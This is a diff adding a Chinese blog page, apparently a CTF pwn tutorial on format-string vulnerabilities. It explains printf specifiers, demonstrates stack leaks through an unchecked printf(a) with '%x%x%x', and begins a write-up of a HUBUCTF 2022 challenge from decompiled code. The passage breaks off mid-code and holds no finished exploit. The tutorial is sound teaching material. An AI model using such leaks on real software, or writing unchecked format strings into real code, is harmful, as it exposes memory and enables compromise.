@@ -1,0 +1,668 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>格式化字符串漏洞 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">2.</span> <span class="toc-text">格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">2.2.</span> <span class="toc-text">字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E6%95%B0"><span class="toc-number">2.3.</span> <span class="toc-text">参数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">4.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2%E6%A0%88%E4%B8%8A%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">4.1.</span> <span class="toc-text">格式化字符串泄露栈上的内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-fmt"><span class="toc-number">4.1.1.</span> <span class="toc-text">[HUBUCTF 2022 新生赛]fmt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E7%9A%84%E8%AF%BB%E5%8F%96%E5%8F%8A%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E5%86%99%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">任意内存的读取及任意内存写入</span></a></li></ol></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>格式化字符串漏洞</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/3
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Pwn/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Pwn
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/fmt/" style="color: #ff7d73">fmt</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">2.7k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">10分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.c12en.fun/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">https://www.c12en.fun/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/</a></p>
+<span id="more"></span>
+
+<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong></p>
+<p>通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式</p>
+<p>几乎所有的 C&#x2F;C++ 程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong></p>
+<p>一般来说，格式化字符串在利用的时候主要分为三个部分：</p>
+<ul>
+<li>格式化字符串函数</li>
+<li>格式化字符串</li>
+<li>后续参数，<strong>可选</strong></li>
+</ul>
+<p><img src="/blog/2024/05/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20240503232535047.png" alt="image-20240503232535047"></p>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>常见的格式化字符串函数有：</p>
+<ul>
+<li>输入<ul>
+<li>scanf</li>
+</ul>
+</li>
+<li>输出</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">函数</th>
+<th align="center">基本介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">printf</td>
+<td align="center">输出到 stdout</td>
+</tr>
+<tr>
+<td align="center">fprintf</td>
+<td align="center">输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td align="center">vprintf</td>
+<td align="center">根据参数列表格式化输出到 stdout</td>
+</tr>
+<tr>
+<td align="center">vfprintf</td>
+<td align="center">根据参数列表格式化输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td align="center">sprintf</td>
+<td align="center">输出到字符串</td>
+</tr>
+<tr>
+<td align="center">snprintf</td>
+<td align="center">输出指定字节数到字符串</td>
+</tr>
+<tr>
+<td align="center">vsprintf</td>
+<td align="center">根据参数列表格式化输出到字符串</td>
+</tr>
+<tr>
+<td align="center">vsnprintf</td>
+<td align="center">根据参数列表格式化输出指定字节到字符串</td>
+</tr>
+<tr>
+<td align="center">setproctitle</td>
+<td align="center">设置 argv</td>
+</tr>
+<tr>
+<td align="center">syslog</td>
+<td align="center">输出日志</td>
+</tr>
+<tr>
+<td align="center">err, verr, warn, vwarn 等</td>
+<td align="center">。。。</td>
+</tr>
+</tbody></table>
+<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>格式化字符串的基本格式：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">%</span><span class="token punctuation">[</span>parameter<span class="token punctuation">]</span><span class="token punctuation">[</span>flags<span class="token punctuation">]</span><span class="token punctuation">[</span>field width<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">.</span>precision<span class="token punctuation">]</span><span class="token punctuation">[</span>length<span class="token punctuation">]</span>type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li><p>parameter：可以忽略，或者是<code>n$</code>，n是用这个格式说明符（specifier）<strong>显示第几个参数</strong>；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出</p>
+<p>例：<code>printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17)</code> 产生 <code>17 0x11; 16 0x10</code></p>
+</li>
+<li><p>flags：可为0个或多个</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>+</code></td>
+<td>总是表示有符号数值的’<code>+</code>‘或’<code>-</code>‘号，缺省情况是忽略正数的符号。仅适用于数值类型。</td>
+</tr>
+<tr>
+<td><em>空格</em></td>
+<td>使得有符号数的输出如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与’+’同时出现，则空格说明符被忽略。</td>
+</tr>
+<tr>
+<td><code>-</code></td>
+<td>左对齐。缺省情况是右对齐。</td>
+</tr>
+<tr>
+<td><code>#</code></td>
+<td>对于’<code>g</code>‘与’<code>G</code>‘，不删除尾部0以表示精度。对于’<code>f</code>‘, ‘<code>F</code>‘, ‘<code>e</code>‘, ‘<code>E</code>‘, ‘<code>g</code>‘, ‘<code>G</code>‘, 总是输出小数点。对于’<code>o</code>‘, ‘<code>x</code>‘, ‘<code>X</code>‘, 在非0数值前分别输出前缀<code>0</code>, <code>0x</code>, and <code>0X</code>表示数制。</td>
+</tr>
+<tr>
+<td><code>0</code></td>
+<td>如果<em>width</em>选项前缀以<code>0</code>，则在左侧用<code>0</code>填充直至达到宽度要求。例如<code>printf(&quot;%2d&quot;, 3)</code>输出”<code> 3</code>“，而<code>printf(&quot;%02d&quot;, 3)</code>输出”<code>03</code>“。如果<code>0</code>与<code>-</code>均出现，则<code>0</code>被忽略，即左对齐依然用空格填充。</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>field width：输出的最小宽度</p>
+</li>
+<li><p>precision：输出的最大长度</p>
+</li>
+<li><p>length：输出的长度， <code>hh</code>输出一个字节，<code>h</code>输出一个双字节</p>
+</li>
+<li><p>type：</p>
+<ul>
+<li><code>d/i</code>：有符号整数</li>
+<li><code>u</code>：无符号整数</li>
+<li><code>x/X</code>：16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
+<li><code>o</code>：8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>
+<li><code>s</code>：如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>
+<li><code>c</code>：如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>
+<li><code>p</code>： void * 型，输出对应变量的值。<code>printf(&quot;%p&quot;,a)</code> 用地址的格式打印变量 a 的值，<code>printf(&quot;%p&quot;, &amp;a)</code> 打印变量 a 所在的地址。</li>
+<li><code>n</code>：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li>
+<li><code>%</code>： ‘<code>%</code>‘字面值，不接受任何 flags, width</li>
+</ul>
+</li>
+</ul>
+<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>就是相应的要输出的变量</p>
+<hr>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>拿我们最熟悉的C语言的<code>printf</code>函数来说，语法如下</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"格式化字符串"</span><span class="token punctuation">,</span>参量… <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以这样写：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>也可以这样写：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"0w0"</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>虽然没格式化字符，但是依旧可以输出0w0</p>
+<p>现在来看第三种写法：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"%x%x%x"</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这次我们没给<code>printf</code>参数，而是给了它格式化字符<code>%x</code>，看看输出</p>
+<p><img src="/blog/2024/05/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20240503234116148.png" alt="image-20240503234116148"></p>
+<p>像是输出了地址的16进制字符串</p>
+<p>我们明明没有给他用以输出的参数，那么这串数据是从哪里来的？</p>
+<p>用图来表示一下<code>printf</code>输出的时候栈结构是什么样子：</p>
+<p><img src="/blog/2024/05/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20240503234215667.png" alt="image-20240503234215667"></p>
+<p>注：<strong>格式化字符串不一定要放在栈顶才能实现任意地址写入</strong></p>
+<p>拿下面这个例子来讲，就是这样的：</p>
+<p><img src="/blog/2024/05/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20240503234259827.png" alt="image-20240503234259827"></p>
+<p>其栈上的布局为</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">some value	<span class="token comment">// 假设 3.14 上面的值为某个未知的值</span>
+<span class="token number">3.14</span>
+<span class="token number">123456</span>
+addr of <span class="token string">"red"</span>
+addr of format string<span class="token operator">:</span> Color <span class="token operator">%</span>s<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在进入<code>printf</code>之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况：</p>
+<ol>
+<li>当前字符不是<code>%</code>，直接输出到相应标准输出</li>
+<li>当前字符是<code>%</code>， 继续读取下一个字符<ul>
+<li>如果没有字符，报错</li>
+<li>如果下一个字符是<code>%</code>, 输出<code>%</code></li>
+<li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li>
+</ul>
+</li>
+</ol>
+<p>现在我们把程序改为：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Color %s, Number %d, Float %4.2f"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在不提供参数的情况下，程序运行，会将栈上存储 addr of format string 上面的三个变量分别解析为：</p>
+<ol>
+<li>解析其地址对应的字符串</li>
+<li>解析其内容对应的整形值</li>
+<li>解析其内容对应的浮点值</li>
+</ol>
+<p>对于 2，3 来说倒还无妨，但是对于对于 1 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃</p>
+<p>总结一下，就是如果我们只传入了格式化字符串而没有传入参数，</p>
+<p>那么格式化字符串仍然会遵循着原先的逻辑，向高地址处逐个字长的输出<strong>当前栈的内容&#x2F;指针</strong>（输出的方式根据其格式化字符的不同而不同）</p>
+<hr>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>pwn题中的格式化字符串通常有两种</p>
+<p>第一种，使用格式化字符串泄露栈上的内容(canary或者是随机数不一定)</p>
+<p>第二种，任意内存的读取及任意内存写入</p>
+<h2 id="格式化字符串泄露栈上的内容"><a href="#格式化字符串泄露栈上的内容" class="headerlink" title="格式化字符串泄露栈上的内容"></a>格式化字符串泄露栈上的内容</h2><h3 id="HUBUCTF-2022-新生赛-fmt"><a href="#HUBUCTF-2022-新生赛-fmt" class="headerlink" title="[HUBUCTF 2022 新生赛]fmt"></a>[HUBUCTF 2022 新生赛]fmt</h3><p>checksec一下</p>
+<p><img src="/blog/2024/05/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20240503235834564.png" alt="image-20240503235834564"></p>
+<p>64位除了canary全开</p>
+<p>ida看一眼</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-68h]</span>
+  <span class="token keyword">char</span> format<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-60h] BYREF</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-40h] BYREF</span>
+  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-38h]</span>
+  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-30h]</span>
+  __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-28h]</span>
+  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-20h]</span>
+  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-18h]</span>
+  __int16 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+60h] [rbp-10h]</span>
+  <span class="token keyword">unsigned</span> __int64 v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-8h]</span>
+
+  v12 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  v6 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  v7 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  v8 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  v9 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  v10 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> stream <span class="token punctuation">)</span>
+    <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
